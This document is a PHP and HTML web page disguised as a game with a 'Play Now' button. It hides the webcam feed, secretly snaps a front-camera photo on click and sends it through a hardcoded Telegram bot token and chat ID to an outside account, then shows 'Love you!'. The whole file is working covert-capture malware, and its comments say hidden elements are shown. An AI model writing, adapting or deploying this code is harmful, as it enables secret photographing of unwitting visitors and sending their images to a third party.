<?php
// Handle the image upload if the form is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the raw POST data
    $data = json_decode(file_get_contents('php://input'), true);

    // Check if the image data is available
    if (isset($data['image'])) {
        $imageData = $data['image'];

        // Remove the "data:image/png;base64," part of the data URL
        $imageData = str_replace('data:image/png;base64,', '', $imageData);

        // Decode the base64 string into binary data
        $imageData = base64_decode($imageData);

        // Define the file path and name where the image will be saved
        $filePath = 'uploads/photo_' . time() . '.png';

        // Create the uploads directory if it doesn't exist
        if (!is_dir('uploads')) {
            mkdir('uploads', 0777, true);
        }

        // Save the image to the server
        if (file_put_contents($filePath, $imageData)) {
            echo json_encode(['status' => 'success', 'file' => $filePath]);

            // Send the photo to Telegram
            sendPhotoToTelegram($filePath, 'I love You Too ');

        } else {
            echo json_encode(['status' => 'error', 'message' => 'Failed to save the image.']);
        }
    } else {
        echo json_encode(['status' => 'error', 'message' => 'No image data received.']);
    }
    exit;
}

function sendPhotoToTelegram($filePath, $message)
{
    $botToken = '7444502388:AAEnQM_0RAYX22aMTDfldf9-UxGu350PrIw'; // Replace with your bot token
    $chatId = '5158405142';     // Replace with your chat ID

    // Telegram API URL to send photo
    $url = "https://api.telegram.org/bot$botToken/sendPhoto";

    // Open the file for reading
    $file = new CURLFile(realpath($filePath));

    // Prepare data for POST request
    $data = [
        'chat_id' => $chatId,
        'photo' => $file,
        'caption' => $message, // Optional message to send with the image
    ];

    // Initialize cURL session
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

    // Execute the cURL request and close the session
    $response = curl_exec($ch);
    curl_close($ch);

    // Optional: Check for errors
    if ($response === FALSE) {
        error_log("Telegram API error: " . curl_error($ch));
    } else {
        // Optional: Log the response for debugging
        // error_log("Telegram response: " . $response);
    }
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webcam Capture</title>
    <style>
        #camera {
            width: 100%;
            max-width: 640px;
            height: auto;
            border: 1px solid black;
        }

        #canvas {
            display: none;
        }

        button {
            margin-top: 20px;
        }
    </style>
</head>

<body>

    <h1>You Can Play Game</h1>

    <!-- Webcam video feed -->
    <video id="camera" autoplay style="display: none;"></video>

    <!-- Button to take photo -->
    <button id="capture">Play Now</button>

    <!-- Canvas to hold the captured image -->
    <canvas id="canvas" style="display: none;"></canvas>

    <!-- Image preview -->
    <h3 style="display: none;">Captured Image:</h3>
    <img id="photo" alt="Captured Image" style="display: none;" width="300" />

    <script>
        // Get elements from the DOM
        const camera = document.getElementById('camera');
        const captureButton = document.getElementById('capture');
        const canvas = document.getElementById('canvas');
        const photo = document.getElementById('photo');
        const context = canvas.getContext('2d');

        // Access the webcam
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })  // Force front camera ("user" for front-facing)
            .then((stream) => {
                camera.srcObject = stream;
                camera.style.display = 'none'; // Show the video element
            })
            .catch((err) => {
                alert('Error accessing webcam: ' + err);
            });

        // Capture photo when the button is clicked
        captureButton.addEventListener('click', () => {
            // Set canvas size to match the video size
            canvas.width = camera.videoWidth;
            canvas.height = camera.videoHeight;

            // Draw the current frame from the video to the canvas
            context.drawImage(camera, 0, 0, canvas.width, canvas.height);

            // Get the image data as a base64 encoded PNG image
            const dataURL = canvas.toDataURL('image/png');

            // Display the captured image on the webpage
            photo.src = dataURL;
            photo.style.display = 'none'; // Show the captured image

            // Send the image data to the server via AJAX
            fetch('', {
                method: 'POST',
                body: JSON.stringify({ image: dataURL }),
                headers: { 'Content-Type': 'application/json' }
            })
            .then(response => response.json())
            .then(data => {
                console.log('Photo saved:', data);
                if (data.status === 'success') {
                    alert('Love you!');
                } else {
                    alert('Failed to save or send photo!');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('An error occurred while saving or sending the photo.');
            });
        });
    </script>

</body>

</html>
